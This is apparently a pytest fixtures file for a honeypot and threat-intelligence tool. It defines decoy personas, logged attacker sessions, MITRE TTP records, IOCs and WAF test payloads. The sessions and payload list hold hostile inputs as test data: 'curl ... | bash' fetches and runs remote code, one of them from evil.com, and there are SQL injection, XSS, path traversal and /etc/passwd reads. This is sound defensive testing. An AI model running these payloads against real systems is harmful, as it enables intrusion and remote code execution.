"""
Shared test fixtures for EmberHoneypot test suite.

Provides:
- Async HTTP test client for FastAPI
- Mock Ember/Centuria connections
- Temp database, test personas, and sample data
"""

from __future__ import annotations

import asyncio
from collections.abc import AsyncGenerator
from datetime import datetime
from typing import Any
from uuid import UUID, uuid4

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from ember_honeypot.api.main import app
from ember_honeypot.models import (
    DecoyPersona,
    HoneypotType,
    InstanceStatus,
    InteractionLog,
    InteractionType,
    ParsedCommand,
    SophisticationLevel,
    ThreatScore,
    TTPRecord,
    IOC,
    IOCType,
    HoneypotInstance,
)
from ember_honeypot.swarm import CenturiaAdapter, ThreatFeed, AdaptiveDefense, ThreatIntel, ThreatUpdate
from ember_honeypot.integration import EmberArmorAdapter
from ember_honeypot.config import AppConfig as HoneypotConfig


# ---------------------------------------------------------------------------
# Event loop
# ---------------------------------------------------------------------------

@pytest.fixture(scope="session")
def event_loop():
    """Create a session-scoped event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# ---------------------------------------------------------------------------
# Async HTTP client
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture
async def async_client() -> AsyncGenerator[AsyncClient, None]:
    """Async HTTP test client for FastAPI app."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        yield client


# ---------------------------------------------------------------------------
# Mock services
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture
async def mock_centuria() -> AsyncGenerator[CenturiaAdapter, None]:
    """Pre-connected Centuria adapter with mock responses."""
    adapter = CenturiaAdapter(endpoint="http://mock-centuria:9000")
    await adapter.connect()
    yield adapter
    await adapter.disconnect()


@pytest_asyncio.fixture
async def mock_ember() -> AsyncGenerator[EmberArmorAdapter, None]:
    """Pre-authenticated Ember Armor adapter with mock responses."""
    adapter = EmberArmorAdapter(
        auth_url="http://mock-ember:8080/auth",
        audit_url="http://mock-ember:8080/audit",
        api_key="test-api-key-12345",
    )
    await adapter.authenticate()
    yield adapter


@pytest.fixture
def threat_feed() -> ThreatFeed:
    """Empty threat feed for testing."""
    return ThreatFeed(max_history=100)


@pytest.fixture
def adaptive_defense() -> AdaptiveDefense:
    """Fresh adaptive defense engine."""
    return AdaptiveDefense(default_ttl=3600)


# ---------------------------------------------------------------------------
# Test data factories
# ---------------------------------------------------------------------------

@pytest.fixture
def test_persona() -> DecoyPersona:
    """Standard test decoy persona."""
    return DecoyPersona(
        id=uuid4(),
        role="developer",
        name="Alex Developer",
        username="adev",
        password_hint="My dog's name + 123",
        ssh_keys=["ssh-rsa AAAA...test"],
        file_preferences=[".py", ".js", ".sql"],
        typical_commands=["ls -la", "git status", "python manage.py runserver"],
        environment_vars={"DEBUG": "1", "DATABASE_URL": "postgres://localhost:5432/app"},
        fake_projects=["api-gateway", "payment-service"],
    )


@pytest.fixture
def admin_persona() -> DecoyPersona:
    """Admin decoy persona."""
    return DecoyPersona(
        id=uuid4(),
        role="admin",
        name="Sam Admin",
        username="sadmin",
        password_hint="Company name + year",
        ssh_keys=["ssh-rsa AAAA...admin"],
        file_preferences=[".conf", ".sh", ".log"],
        typical_commands=["sudo -l", "cat /var/log/syslog", "systemctl status"],
        environment_vars={"HOME": "/root", "EDITOR": "vim"},
        fake_projects=["infrastructure", "monitoring"],
    )


@pytest.fixture
def sample_interactions() -> list[InteractionLog]:
    """Sample interaction logs for testing."""
    session_id = uuid4()
    attacker_id = uuid4()
    honeypot_id = uuid4()
    base_time = datetime.utcnow()

    return [
        InteractionLog(
            id=uuid4(),
            session_id=session_id,
            attacker_id=attacker_id,
            honeypot_id=honeypot_id,
            timestamp=base_time,
            sequence_number=1,
            interaction_type=InteractionType.LOGIN,
            raw_input="admin:password123",
            raw_output="Access denied",
            source_ip="192.168.1.100",
            source_port=54321,
            destination_port=2222,
        ),
        InteractionLog(
            id=uuid4(),
            session_id=session_id,
            attacker_id=attacker_id,
            honeypot_id=honeypot_id,
            timestamp=base_time,
            sequence_number=2,
            interaction_type=InteractionType.COMMAND,
            raw_input="ls -la",
            raw_output="total 128\\ndrwxr-xr-x ...",
            parsed_command=ParsedCommand(binary="ls", arguments=["-la"]),
            source_ip="192.168.1.100",
            source_port=54321,
            destination_port=2222,
        ),
        InteractionLog(
            id=uuid4(),
            session_id=session_id,
            attacker_id=attacker_id,
            honeypot_id=honeypot_id,
            timestamp=base_time,
            sequence_number=3,
            interaction_type=InteractionType.COMMAND,
            raw_input="whoami",
            raw_output="developer",
            parsed_command=ParsedCommand(binary="whoami", arguments=[]),
            source_ip="192.168.1.100",
            source_port=54321,
            destination_port=2222,
        ),
        InteractionLog(
            id=uuid4(),
            session_id=session_id,
            attacker_id=attacker_id,
            honeypot_id=honeypot_id,
            timestamp=base_time,
            sequence_number=4,
            interaction_type=InteractionType.COMMAND,
            raw_input="cat /etc/passwd",
            raw_output="root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1...",
            parsed_command=ParsedCommand(binary="cat", arguments=["/etc/passwd"]),
            source_ip="192.168.1.100",
            source_port=54321,
            destination_port=2222,
        ),
        InteractionLog(
            id=uuid4(),
            session_id=session_id,
            attacker_id=attacker_id,
            honeypot_id=honeypot_id,
            timestamp=base_time,
            sequence_number=5,
            interaction_type=InteractionType.COMMAND,
            raw_input="curl http://192.168.1.200/malware.sh | bash",
            raw_output="bash: line 1: /dev/tcp: Connection refused",
            parsed_command=ParsedCommand(
                binary="curl", arguments=["http://192.168.1.200/malware.sh"], pipe_chain=["bash"]
            ),
            source_ip="192.168.1.100",
            source_port=54321,
            destination_port=2222,
        ),
    ]


@pytest.fixture
def sample_ttps() -> list[TTPRecord]:
    """Sample TTP records for testing."""
    return [
        TTPRecord(
            tactic="Discovery",
            tactic_id="TA0007",
            technique="File and Directory Discovery",
            technique_id="T1083",
            procedure="Attacker ran 'ls -la' to list files",
            evidence=["log-001"],
            confidence=0.8,
        ),
        TTPRecord(
            tactic="Discovery",
            tactic_id="TA0007",
            technique="System Owner/User Discovery",
            technique_id="T1033",
            procedure="Attacker ran 'whoami' to discover current user",
            evidence=["log-002"],
            confidence=0.9,
        ),
        TTPRecord(
            tactic="Execution",
            tactic_id="TA0002",
            technique="Command and Scripting Interpreter",
            technique_id="T1059",
            procedure="Attacker attempted to execute remote script via curl | bash",
            evidence=["log-003"],
            confidence=0.75,
        ),
        TTPRecord(
            tactic="Command and Control",
            tactic_id="TA0011",
            technique="Application Layer Protocol",
            technique_id="T1071",
            procedure="Attacker used curl for C2 communication",
            evidence=["log-003"],
            confidence=0.6,
        ),
    ]


@pytest.fixture
def sample_threat_score() -> ThreatScore:
    """Sample threat score for testing."""
    return ThreatScore(
        profile_id=uuid4(),
        overall=0.65,
        sophistication=0.70,
        persistence=0.40,
        stealth=0.30,
        aggressiveness=0.80,
        adaptability=0.50,
        rationale=["High aggressiveness detected", "Sophisticated techniques observed"],
    )


@pytest.fixture
def sample_iocs() -> list[IOC]:
    """Sample IOCs for testing."""
    return [
        IOC(
            id=uuid4(),
            ioc_type=IOCType.IP,
            value="192.168.1.100",
            confidence=0.9,
            context="Attacker source IP",
        ),
        IOC(
            id=uuid4(),
            ioc_type=IOCType.URL,
            value="http://192.168.1.200/malware.sh",
            confidence=0.75,
            context="Malware download URL",
        ),
        IOC(
            id=uuid4(),
            ioc_type=IOCType.IP,
            value="192.168.1.200",
            confidence=0.8,
            context="Secondary C2 IP",
        ),
    ]


@pytest.fixture
def attack_payloads() -> list[str]:
    """Sample attack payloads for WAF rule generation testing."""
    return [
        "GET /search?q=1' UNION SELECT username,password FROM users--",
        "POST /comment HTTP/1.1\\n\\n<script>alert('xss')</script>",
        "GET /file?path=../../../etc/passwd",
        "POST /api/run HTTP/1.1\\n\\n{\"cmd\":\"cat /etc/passwd\"}",
        "curl -s http://evil.com/payload | bash",
    ]
